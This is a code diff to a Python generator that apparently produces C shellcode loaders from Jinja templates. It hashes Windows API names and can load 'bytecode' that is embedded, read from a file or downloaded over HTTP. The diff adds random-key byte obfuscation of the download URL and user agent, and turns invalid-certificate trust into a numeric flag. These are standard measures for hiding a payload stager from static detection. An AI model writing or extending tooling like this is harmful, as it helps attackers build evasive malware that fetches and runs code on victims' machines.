@@ -3,6 +3,7 @@ import subprocess
 import sys
 import uuid
 import importlib
+import random
 from jinja2 import Environment, FileSystemLoader
 
 def _djb2_hash(s):
@@ -11,6 +12,15 @@ def _djb2_hash(s):
     for char in s:
         hash_val = ((hash_val << 5) + hash_val) + ord(char)
     return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer
+
+def _obfuscate_string(string_data, key):
+    """Obfuscates a string using a byte-wise subtraction and returns a C-style byte array."""
+    if not string_data:
+        return ""
+    obfuscated_bytes = bytearray()
+    for char in string_data.encode('utf-8'):
+        obfuscated_bytes.append((char - key) & 0xFF)
+    return ", ".join([f"0x{byte:02x}" for byte in obfuscated_bytes])
 
 def _get_api_hashes():
     """Returns a dictionary of all required API name hashes."""
@@ -76,14 +86,24 @@ def encode(input_filepath, original_filename, options):
         data_source_choice = options.get('data_source', 'embedded')
         template_vars['data_source'] = data_source_choice
         template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
+        obfuscate_strings = options.get('obfuscate_strings') == 'true'
+        template_vars['obfuscate_strings'] = obfuscate_strings
 
         if data_source_choice == 'file':
             template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
             template_vars['bytecode_array'] = ""
         elif data_source_choice == 'http':
-            template_vars['url'] = options.get('url', '').replace('\\', '\\\\')
-            template_vars['user_agent'] = options.get('user_agent', 'Mozilla/5.0')
-            template_vars['trust_invalid_cert'] = options.get('trust_invalid_cert', 'false')
+            url = options.get('url', '')
+            user_agent = options.get('user_agent', 'Mozilla/5.0')
+            if obfuscate_strings:
+                key = random.randint(1, 255)
+                template_vars['obfuscation_key'] = key
+                template_vars['url_obfuscated'] = _obfuscate_string(url, key)
+                template_vars['user_agent_obfuscated'] = _obfuscate_string(user_agent, key)
+            else:
+                template_vars['url'] = url.replace('\\', '\\\\')
+                template_vars['user_agent'] = user_agent
+            template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
             template_vars['bytecode_array'] = ""
         else: # embedded
             with open(input_filepath, "rb") as f:
